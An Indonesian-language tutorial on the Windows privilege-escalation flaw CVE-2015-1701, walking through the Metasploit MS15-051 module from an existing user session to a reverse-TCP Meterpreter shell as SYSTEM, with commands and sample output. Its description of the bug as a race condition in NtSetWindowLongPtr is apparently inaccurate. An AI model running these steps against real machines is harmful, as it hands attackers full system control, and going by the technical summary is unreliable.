# CVE-2015-1701

## A. Apa itu CVE-2015-1701?

[CVE-2015-1701](https://nvd.nist.gov/vuln/detail/cve-2015-1701) adalah kerentanan local privilege escalation (LPE) pada driver kernel Windows `win32k.sys`. Kerentanan ini memungkinkan penyerang dengan hak akses user biasa untuk meningkatkan hak akses menjadi `NT AUTHORITY\SYSTEM`, level tertinggi dalam sistem Windows.

Eksploitasi ini memanfaatkan race condition dalam fungsi `NtSetWindowLongPtr()` yang memungkinkan manipulasi objek window di kernel secara tidak aman, sehingga memungkinkan overwrite pointer dan eksekusi kode sewenang-wenang dengan hak `SYSTEM`.

## B. Detail Teknis
- CVE ID: `CVE-2015-1701`  
- Tanggal Rilis: `14 April 2015`  
- Tipe: Local Privilege Escalation (LPE)  
- Fungsi Rentan: `NtSetWindowLongPtr`  
- Komponen: `win32k.sys`  
- Platform: `Windows 7 SP1`, `Windows 8`, `Windows Server 2008 R2`, `2012`  
- Arsitektur: `x86` dan `x64`  
- Skor CVSS: `7.2` (Tinggi)


## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `CVE-2015-1701`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://learn.microsoft.com/id-id/security-updates/securitybulletins/2015/ms15-051#affected-software](https://learn.microsoft.com/id-id/security-updates/securitybulletins/2015/ms15-051#affected-software)

## D. Langkah Penggunaan di Metasploit

1. Dapatkan Akses Awal (User Biasa):

   ```
   msf6 > sessions          # Lihat sesi yang ada
   msf6 > sessions -i 1     # Masuk ke sesi dengan ID 1
   msf6 > getuid            # Melihat user saat ini
   msf6 > sysinfo           # Informasi sistem target
   ```

2. Keluar dari Sesi Meterpreter:
   
   ```
   msf6 > background
   ```

3. Gunakan Modul Exploit MS15-051:

   ```
   msf6 > use exploit/windows/local/ms15_051_client_copy_image
   ```

4. Setting Parameter Penting:

   ```
   msf6 > set SESSION <ID>
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```
   
5. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   [*] win32k.sys file version: 6.1.7601.17514 branch: 17
   [*] Reflectively injecting the exploit DLL and executing it...
   [*] Launching msiexec to host the DLL...
   [+] Process 1992 launched.
   [*] Reflectively injecting the DLL into 1992...
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
   [*] Meterpreter session 15 opened (192.168.1.42:4444 -> 192.168.1.50:49174) at 2025-05-14 16:19:31 +0700

   meterpreter > 
   ```

   Itu artinya kita sudah mendapatkan akses tertinggi dari sistem. Untuk mengeceknya, ketikkan perintah berikut:

   ```
   meterpreter > getuid 
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > getuid 
   Server username: NT AUTHORITY\SYSTEM
   meterpreter > 
   ```

   > Keterangan: `NT AUTHORITY\SYSTEM` adalah akun tertinggi di sistem Windows itu setara dengan `root` pada sistem Linux.
